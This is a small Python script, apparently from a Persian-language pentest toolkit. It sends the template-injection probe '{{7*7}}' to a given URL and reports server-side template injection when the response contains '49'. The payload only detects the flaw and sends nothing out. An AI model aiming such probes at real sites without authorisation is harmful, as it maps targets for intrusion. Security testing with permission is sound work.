import sys
import requests
from utils.error_handler import log_info, log_error
from termcolor import colored

def exploit_ssti(url):
    payload = '{{7*7}}'
    try:
        r = requests.get(url, params={'q': payload}, timeout=10)
        if '49' in r.text:
            print(colored(f'[+] SSTI موفقیت‌آمیز در {url}', 'green'))
            log_info(f'SSTI at {url}')
        else:
            print(colored(f'[-] SSTI در {url} تأیید نشد', 'yellow'))
    except Exception as e:
        log_error(str(e))
        print(colored(f'[!] خطا: {e}', 'red'))

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python3 ssti.py <url>')
        sys.exit(1)
    exploit_ssti(sys.argv[1])